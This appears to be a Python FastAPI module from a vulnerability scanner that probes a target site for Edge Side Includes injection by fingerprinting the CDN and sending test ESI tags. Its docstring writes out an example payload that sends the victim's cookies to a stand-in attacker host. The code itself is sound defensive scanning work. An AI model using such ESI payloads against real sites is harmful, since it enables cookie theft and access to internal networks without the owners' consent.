"""esi_injection_probe — Edge Side Includes injection (Akamai/Varnish/Fastly).

ESI: <esi:include src="http://internal-server/secret"/> evaluated at the
edge. If a CDN/reverse-proxy supports ESI and your app reflects user
input into a cached response, attacker injects ESI tags to:
  - Read internal-network resources
  - Steal authentication cookies (via <esi:include src='http://attacker?c='+$(HTTP_COOKIE)>)
  - DoS via recursion

Probes: POST/GET with payload, look for response unmodified BUT cache
header indicates ESI-enabled CDN, OR direct ESI evaluation marker.
"""
from urllib.parse import quote
from fastapi import APIRouter, Depends
from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                            safe_request, wrap_finding, standard_response)
from tools._vl_core.turbo import vl_turbo

router = APIRouter()

# Reflection probe — find where user input echoes back
REFLECT_PROBES = [
    ("q",      "/search?q={}"),
    ("query",  "/?query={}"),
    ("name",   "/api/echo?name={}"),
    ("path",   "/{}"),
]
MARKER = "VULNUSLAB-ESI-MARKER-9876"
# Two ESI payloads: harmless include of own URL (verify ESI processing)
ESI_PAYLOAD_VAR = "<esi:vars>$(HTTP_USER_AGENT)</esi:vars>"
ESI_PAYLOAD_INC = "<esi:include src='/vulnuslab-esi-test'/>"

# CDN signatures that commonly support ESI
ESI_CDN_BANNERS = ["akamai", "varnish", "fastly", "incapsula"]


@router.post("/api/webapp/scan/esi_injection_probe")
@vl_turbo()
def scan_esi_injection_probe(req: ScanRequest, payload=Depends(verify_scan_quota)):
    base = web_url(req.target).rstrip("/")

    # 1. Detect CDN that supports ESI
    r = safe_request("GET", base + "/",
        headers={"User-Agent": "VulnusLab/1.0"},
        req=req, timeout=8, allow_redirects=True)
    if r is None:
        return standard_response(
            tool="esi_injection_probe", target=req.target, findings=[],
            tests_performed=1, vulnerable=False,
            skipped_reason="Could not fetch homepage")

    server = (r.headers.get("server") or "").lower()
    via = (r.headers.get("via") or "").lower()
    cdn_match = [c for c in ESI_CDN_BANNERS if c in server or c in via]

    # 2. Find a reflection point
    reflection_url = None
    for param, tmpl in REFLECT_PROBES:
        url = base + tmpl.format(MARKER)
        rr = safe_request("GET", url,
            headers={"User-Agent": "VulnusLab/1.0"},
            req=req, timeout=8, allow_redirects=False)
        if rr is not None and rr.status_code == 200 and MARKER in (rr.text or ""):
            reflection_url = (param, tmpl)
            break

    findings = []

    if not reflection_url and not cdn_match:
        return standard_response(
            tool="esi_injection_probe", target=req.target,
            findings=[wrap_finding(
                "No reflection point + no ESI-capable CDN detected",
                "POSITIVE", cwe="CWE-79",
                remediation="No ESI injection surface from this probe.",
                evidence_marker=f"server: {server[:40]}, via: {via[:40]}")],
            tests_performed=1 + len(REFLECT_PROBES), vulnerable=False,
            tests_summary="No ESI surface")

    # 3. Try ESI payload
    if reflection_url:
        param, tmpl = reflection_url
        for payload in (ESI_PAYLOAD_VAR, ESI_PAYLOAD_INC):
            url = base + tmpl.format(quote(payload))
            rr = safe_request("GET", url,
                headers={"User-Agent": "ESI-INJECTION-TEST-UA-VULNUSLAB"},
                req=req, timeout=10, allow_redirects=False)
            if rr is None: continue
            body = (rr.text or "")[:50000]
            # Vulnerability indicators:
            # 1. ESI tag REMOVED from body (evaluated) but custom UA echoed
            if payload not in body and "ESI-INJECTION-TEST-UA-VULNUSLAB" in body:
                findings.append(wrap_finding(
                    "ESI injection CONFIRMED — payload evaluated edge-side",
                    "CRITICAL", cvss="9.0", cwe="CWE-94", owasp="A03:2021",
                    remediation="Disable ESI processing on user-reflected paths, "
                                "OR sanitize <esi:...> tags before responses are "
                                "sent to the edge cache. Akamai: 'NOT_FOUND' as ESI "
                                "metadata. Varnish: set ESI=false on dynamic paths.",
                    evidence_marker=f"{tmpl.format('PAYLOAD')} → ESI tag consumed, "
                                      f"$(HTTP_USER_AGENT) evaluated in body"))
                break
            # 2. Body contains the include marker text (vulnuslab-esi-test)
            if "/vulnuslab-esi-test" in body and payload not in body:
                findings.append(wrap_finding(
                    "ESI <esi:include> processed — sub-request executed at edge",
                    "CRITICAL", cvss="9.0", cwe="CWE-94", owasp="A03:2021",
                    remediation="Same as above. Critical: server-side request forgery "
                                "via ESI include lets attacker read internal-network "
                                "endpoints + steal cookies.",
                    evidence_marker=f"{tmpl.format('PAYLOAD')} → /vulnuslab-esi-test "
                                      "referenced in body suggesting ESI fetch executed"))
                break

    if not findings:
        sev = "INFO" if cdn_match else "POSITIVE"
        findings.append(wrap_finding(
            "ESI payload reflected but NOT evaluated by edge",
            sev, cwe="CWE-94",
            remediation="No edge-side ESI processing detected. "
                        + (f"CDN ({cdn_match}) detected — consider "
                            "explicitly disabling ESI on user-input paths."
                            if cdn_match else "Maintain."),
            evidence_marker=(f"reflection at {reflection_url[1]}, " if reflection_url else "")
                              + f"CDN: {cdn_match}, server: {server[:40]}"))

    return standard_response(
        tool="esi_injection_probe", target=req.target, findings=findings,
        tests_performed=1 + len(REFLECT_PROBES) + 2,
        vulnerable=any("CRITICAL" in f.get("severity", "") for f in findings),
        tests_summary=f"CDN: {cdn_match or 'none'}, reflection: {bool(reflection_url)}",
        raw_data={"cdn_match": cdn_match, "server": server[:80], "via": via[:80],
                   "reflection_point": reflection_url})


def register(app):
    app.include_router(router)
